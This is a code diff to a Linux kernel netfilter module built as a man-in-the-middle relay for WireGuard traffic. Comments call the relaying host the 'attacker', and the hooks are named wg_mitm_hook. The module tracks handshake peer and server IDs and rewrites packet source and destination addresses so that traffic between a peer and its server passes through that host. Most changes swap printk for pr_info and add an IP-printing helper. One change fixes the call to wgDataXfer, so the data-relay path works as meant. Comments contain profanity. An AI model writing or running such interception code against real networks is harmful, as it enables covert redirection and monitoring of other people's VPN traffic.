@@ -1,3 +1,5 @@
+#define pr_fmt(fmt) "%s:%s: " fmt, KBUILD_MODNAME, __func__
+
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/netfilter.h>
@@ -61,7 +63,7 @@ struct ring_buffer * make_wg_buf_mem(void)
 {
    // allocate contiguous virtual memory and zero it
    struct ring_buffer * ptr = vzalloc(sizeof(struct ring_buffer));
-   printk(KERN_INFO "Allocd memory buffer\n");
+   pr_info("Allocd memory buffer\n");
    return ptr;
 }
 
@@ -91,13 +93,25 @@ uint16_t cksum_addr(uint16_t sum_old, uint32_t ip_old, uint32_t ip_new)
 }
 // */
 
+// helper function, prints IP address to kernel log
+void printIP(uint32_t ip)
+{
+   pr_cont("\t%d.%d.%d.%d\n", 
+         (unsigned char) (ip & 0xffff), 
+         (unsigned char)((ip >> 8) & 0xffff), 
+         (unsigned char)((ip >> 16) & 0xffff), 
+         (unsigned char)((ip >> 24) & 0xffff));
+   return;
+}
+
+
 /*
  * deallocate memory
  */
 void kill_wg_buf_mem(struct ring_buffer * list)
 {
    kvfree(list);
-   printk(KERN_INFO "freed memory buffer I think.\n");
+   pr_info("freed memory buffer I think.\n");
    return;
 }
 
@@ -113,16 +127,16 @@ int find_pair(struct ring_buffer * list, uint32_t * idx, struct peer_serv_pair *
       if(list->list[ptr].peer.id == *idx) {
          *pair = &(list->list[ptr]);
          //printk(KERN_INFO "memory pointer: %lx\n", pair);
-         printk(KERN_INFO "Found peer: %x\n", (*pair)->peer.id);
+         pr_info("Found peer: %x\n", (*pair)->peer.id);
          //printk(KERN_INFO "Found peer: %x\n", list->list[ptr].peer.id);
          if(pair == NULL) {
             // I can never fucking get pointers right
-            printk(KERN_INFO "Fuck my life.\n");
+            pr_info("Fuck my life.\n");
          }
          return 0;
       }
       if(list->list[ptr].serv.id == *idx) {
-         printk(KERN_INFO "Found server.\n");
+         pr_info("Found server.\n");
          *pair = &(list->list[ptr]);
          return 1;
       }
@@ -131,7 +145,7 @@ int find_pair(struct ring_buffer * list, uint32_t * idx, struct peer_serv_pair *
       }
       ptr--;
    }
-   printk(KERN_INFO "Not found in list.\n");
+   pr_info("Not found in list.\n");
    *pair = NULL;
    return -1;
 }
@@ -142,29 +156,30 @@ void add_peer(struct ring_buffer * list, uint32_t * id, uint32_t * ip)
    list->list[list->tail].peer.id = *id;
    list->list[list->tail].peer.ip_addr = *ip;
    list->tail++;
-   printk(KERN_INFO "Added peer id %x\n", list->list[list->tail - 1].peer.id);
-   printk(KERN_INFO "Added peer at %x\n", list->list[list->tail - 1].peer.ip_addr);
+   pr_info("Added peer id %x\n", list->list[list->tail - 1].peer.id);
+   pr_info("Added peer at %x\n", list->list[list->tail - 1].peer.ip_addr);
 }
 
 // add "serv" to data buffer -- used during second step in handshake
 struct peer_serv_pair * add_serv(struct ring_buffer * list, uint32_t * p_id, uint32_t * s_id, uint32_t * s_ip) 
 {
    struct peer_serv_pair * pair = NULL;
-   printk(KERN_INFO "Add server code.\n");
+   pr_info("Add server code.\n");
    if(find_pair(list, p_id, &pair) < 0) {
-      printk(KERN_INFO "Can't find peer id: %x\n", *p_id);
+      pr_info("Can't find peer id: %x\n", *p_id);
       return NULL;
    }
    if(pair == NULL) {
-      printk(KERN_INFO "fucked up pointer.\n");
+      pr_info("fucked up pointer.\n");
       return NULL;
    }
    //return NULL;
    pair->serv.id = *s_id;
    //return NULL;
    pair->serv.ip_addr = *s_ip;
-   printk(KERN_INFO "Server id:\t%x\n", *s_id);
-   printk(KERN_INFO "At: \t%x\n", *s_ip);
+   pr_info("Server id:\t%x\n", *s_id);
+   pr_info("At:");
+   printIP(*s_ip);
    return pair;
 }
 
@@ -197,7 +212,7 @@ unsigned int wgHandshakeReq(struct iphdr * iph, struct wghdr * wgh)
    if(iph->daddr == EXT_IP) {
       // guess it was the last peer it talked to?
       uint32_t last = find_last(list, iph->saddr);
-      printk(KERN_INFO "Guessing last ip.\n");
+      pr_info("Guessing last ip.\n");
       if(last != 0) {
          iph->daddr = last;
       } else {
@@ -207,7 +222,7 @@ unsigned int wgHandshakeReq(struct iphdr * iph, struct wghdr * wgh)
    }
    // peer id == wgh->index1
    add_peer(list, &(wgh->index1), &(iph->saddr));
-   printk("Accepted handshake initiation.\n");
+   pr_info("Accepted handshake initiation.\n");
    return NF_ACCEPT;
 }
 
@@ -216,21 +231,21 @@ unsigned int wgHandshakeRes(struct iphdr * iph, struct wghdr * wgh)
 {
    struct peer_serv_pair * pair;
    struct ring_buffer * list = wg_l_buf;
-   printk(KERN_INFO "WG handshake response.\n");
+   pr_info("WG handshake response.\n");
    // peer id == wgh->index2
    // serv id == wgh->index1
    pair = add_serv(list, &(wgh->index2), &(wgh->index1), &(iph->saddr));
    if(pair == NULL) {
       // didn't record handshake initiation
       //    drop packet and force re-handshake
-      printk(KERN_INFO "Peer not known.\n");
+      pr_info("Peer not known.\n");
       return NF_DROP;
    }//endif
    // change destination IP from attacker IP to 
    //    peer IP
    //    source address will change on postroute hook
    iph->daddr = pair->peer.ip_addr;
-   printk(KERN_INFO "Sending response: %x to %x\n", iph->saddr, iph->daddr);
+   pr_info("Sending response: %x to %x\n", iph->saddr, iph->daddr);
    return NF_ACCEPT;
 }
 
@@ -242,7 +257,7 @@ unsigned int wgDataXfer(struct iphdr * iph, struct wghdr * wgh)
    // may be peer or server
    struct wg_tuple *src = NULL;
    struct wg_tuple *dst = NULL;
-   printk(KERN_INFO "WG data transfer.\n");
+   pr_info("WG data transfer.\n");
    // find in known associations of peers
    int peer = find_pair(list, &(wgh->index1), &pair);
    if(peer == 1) {
@@ -252,7 +267,7 @@ unsigned int wgDataXfer(struct iphdr * iph, struct wghdr * wgh)
       src = &(pair->serv);
       dst = &(pair->peer);
    } else {
-      printk(KERN_INFO "Can't find session.\n");
+      pr_info("Can't find session.\n");
       return NF_DROP;
    } //endifelse
    iph->daddr = dst->ip_addr;
@@ -284,10 +299,12 @@ unsigned int wg_handler_pre(void * priv, struct sk_buff * skb, const struct nf_h
             return NF_ACCEPT;
          }
          
-         printk(KERN_INFO "Pre Handler run.\n");
-         printk(KERN_INFO "Source:\t%x\n", iph->saddr);
-         printk(KERN_INFO "Dest:\t%x\n", iph->daddr);
-         printk(KERN_INFO "WG type: %x\n", wgh->type);
+         pr_info("Pre Handler run.\n");
+         pr_info("Source IP:");
+         printIP(iph->saddr);
+         pr_info("Dest IP:");
+         printIP(iph->daddr);
+         pr_info("WG type: %x\n", wgh->type);
 
          // Ought to be 0x0n 0x00 0x00 0x00 (n 1, 2, 4)
          // Host endianness is least significant byte first
@@ -297,18 +314,21 @@ unsigned int wg_handler_pre(void * priv, struct sk_buff * skb, const struct nf_h
                // WG handshake step 1
                case 1: 
                   if(wgHandshakeReq(iph, wgh) != NF_ACCEPT) {
+                     pr_info("Dropping handshake request packet.\n");
                      return NF_DROP;
                   }
                   break;
                // WG handshake step 2
                case 2: 
                   if(wgHandshakeRes(iph, wgh) != NF_ACCEPT) {
+                     pr_info("Dropping handshake response packet.\n");
                      return NF_DROP;
                   }
                   break;
                // WG data transfer
                case 4: 
-                  if(wgDataXfer != NF_ACCEPT) {
+                  if(wgDataXfer(iph, wgh) != NF_ACCEPT) {
+                     pr_info("Dropping Xfer packet.\n");
                      return NF_DROP;
                   }
                   break;
@@ -321,10 +341,13 @@ unsigned int wg_handler_pre(void * priv, struct sk_buff * skb, const struct nf_h
    }//endif
    // */
 
+   printk(KERN_INFO "Accepting packet with destination IP:");
+   printIP(iph->daddr);
+
    // fix ip checksum if header changed
    iph->check = 0;
    iph->check = ip_fast_csum(iph, iph->ihl);
-   printk(KERN_INFO "Pre handler returns NF_ACCEPT.\n");
+   //printk(KERN_INFO "Pre handler returns NF_ACCEPT.\n");
    return NF_ACCEPT;
 }
 
@@ -333,7 +356,7 @@ unsigned int wg_handler_post(void * priv, struct sk_buff * skb, const struct nf_
 {
    struct iphdr * iph;
 
-   printk(KERN_INFO "Post Handler run.\n");
+   pr_info("Post Handler run.\n");
    if(!skb) return NF_ACCEPT;
 
    iph = ip_hdr(skb);
@@ -348,10 +371,12 @@ unsigned int wg_handler_post(void * priv, struct sk_buff * skb, const struct nf_
             return NF_ACCEPT;
          }
          
-         printk(KERN_INFO "Post Handler run.\n");
-         printk(KERN_INFO "Source:\t%x\n", iph->saddr);
-         printk(KERN_INFO "Dest:\t%x\n", iph->daddr);
-         printk(KERN_INFO "WG type: %x\n", wgh->type);
+         pr_info("Post Handler run.\n");
+         pr_info("Source IP:");
+         printIP(iph->saddr);
+         pr_info("Dest IP:");
+         printIP(iph->daddr);
+         pr_info("WG type: %x\n", wgh->type);
 
          // Ought to be 0x0n 0x00 0x00 0x00 (n 1, 2, 4)
          // Host endianness is least significant byte first
@@ -361,7 +386,7 @@ unsigned int wg_handler_post(void * priv, struct sk_buff * skb, const struct nf_
             //printk(KERN_INFO "Found WG packet.\n");
             // change source address to attacker and 
             //    fix IP checksum
-            iph->saddr = in_aton(EXT_IFACE);
+            iph->saddr = EXT_IP;
             iph->check = 0;
             iph->check = ip_fast_csum(iph, iph->ihl);
          }
@@ -373,7 +398,7 @@ unsigned int wg_handler_post(void * priv, struct sk_buff * skb, const struct nf_
 
 int register_filter(void)
 {  
-   printk(KERN_INFO "Loading Module.\n");
+   pr_info("Loading Module.\n");
 
    // allocate memory
    wg_l_buf = make_wg_buf_mem();
@@ -397,7 +422,7 @@ int register_filter(void)
 
 void remove_filter(void)
 {
-   printk(KERN_INFO "Killing module.\n");
+   pr_info("Killing module.\n");
    nf_unregister_net_hook(&init_net, &wg_mitm_hook);
 
    nf_unregister_net_hook(&init_net, &wg_mitm_hook2);
